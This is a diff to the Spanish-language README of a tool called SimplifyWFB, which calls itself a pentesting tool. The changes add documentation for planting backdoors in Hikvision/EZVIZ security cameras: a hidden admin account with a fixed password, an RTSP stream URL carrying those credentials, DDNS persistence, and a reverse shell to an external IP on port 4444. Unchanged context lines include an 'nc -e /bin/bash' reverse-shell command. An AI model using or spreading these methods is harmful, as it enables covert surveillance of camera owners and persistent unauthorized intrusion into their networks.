@@ -199,28 +199,60 @@ SimplifyWFB es una herramienta profesional de pentesting que **analiza redes de 
     {
       "host": "192.168.1.50",
       "port": 80,
-      "camera_type": "Hikvision",
+      "camera_type": "hikvision_ezviz",
       "credentials": {
         "username": "admin",
         "password": "12345"
       },
+      "camera_info": {
+        "model": "DS-2CD2142FWD-I",
+        "firmware": "V5.4.5",
+        "resolution": "1920x1080"
+      },
       "access_urls": {
         "web_interface": [
           "http://192.168.1.50:80",
-          "http://192.168.1.50:80/viewer.html"
+          "http://192.168.1.50:80/doc/page/login.asp"
         ],
-        "snapshot": "http://192.168.1.50:80/snapshot.cgi"
+        "rtsp_stream": [
+          "rtsp://admin:12345@192.168.1.50:554/Streaming/Channels/101"
+        ]
       },
       "screenshots": [
         "camera_192.168.1.50_screenshot_1.jpg",
         "camera_192.168.1.50_screenshot_2.jpg"
       ],
-      "video_file": "camera_192.168.1.50_video_1640995200.mp4"
+      "video_file": "camera_192.168.1.50_video_1640995200.mp4",
+      "backdoor_info": {
+        "type": "camera_backdoor",
+        "camera_type": "hikvision_ezviz",
+        "backdoor_methods": [
+          {
+            "method": "admin_user_creation",
+            "username": "backdoor_user",
+            "password": "Backdoor_2024!",
+            "status": "success"
+          }
+        ],
+        "persistent_access": [
+          {
+            "method": "ddns_configuration",
+            "hostname": "backdoor_192_168_1_50.hik-connect.com",
+            "status": "success"
+          }
+        ],
+        "external_connection": {
+          "type": "reverse_shell",
+          "external_ip": "212.95.62.135",
+          "external_port": 4444,
+          "status": "configured"
+        }
+      }
     }
   ]
 }
 ```
-**¿Qué significa?** Información completa de cámaras de seguridad accesibles
+**¿Qué significa?** Información completa de cámaras de seguridad accesibles con backdoors implementados
 
 ---
 
@@ -253,6 +285,14 @@ Si configuraste port forwarding:
 - **Duración**: 5 segundos o 100MB (lo que se cumpla primero)
 - **Formato**: MP4
 - **Ubicación**: Directorio `camera_videos_TIMESTAMP/`
+
+### **MÉTODO 6: Backdoor de Cámara** 🔧
+- **Usuario backdoor**: `backdoor_user`
+- **Contraseña**: `Backdoor_2024!`
+- **Acceso web**: `http://192.168.1.50:80/doc/page/login.asp`
+- **RTSP con backdoor**: `rtsp://backdoor_user:Backdoor_2024!@192.168.1.50:554/Streaming/Channels/101`
+- **DDNS remoto**: `backdoor_192_168_1_50.hik-connect.com`
+- **Conexión externa**: `212.95.62.135:4444`
 
 ---
 
@@ -463,6 +503,7 @@ nc -e /bin/bash TU_IP_PUBLICA 4444
 - **Credenciales válidas** para acceder a sistemas
 - **Acceso completo** al router de la red
 - **Control de cámaras** de seguridad con video descargado
+- **Backdoors en cámaras** Hikvision/EZVIZ
 - **Servicios vulnerables** (MongoDB, Redis, Docker, etc.)
 - **Múltiples formas** de acceder remotamente
 
@@ -472,6 +513,7 @@ nc -e /bin/bash TU_IP_PUBLICA 4444
 - **Panel web** para administración
 - **Backdoors** para acceso oculto
 - **Servicios vulnerables** con backdoors específicos
+- **Cámaras con backdoors** y acceso remoto
 
 ### **✅ CONTROL TOTAL:**
 - **Router configurado** para acceso externo
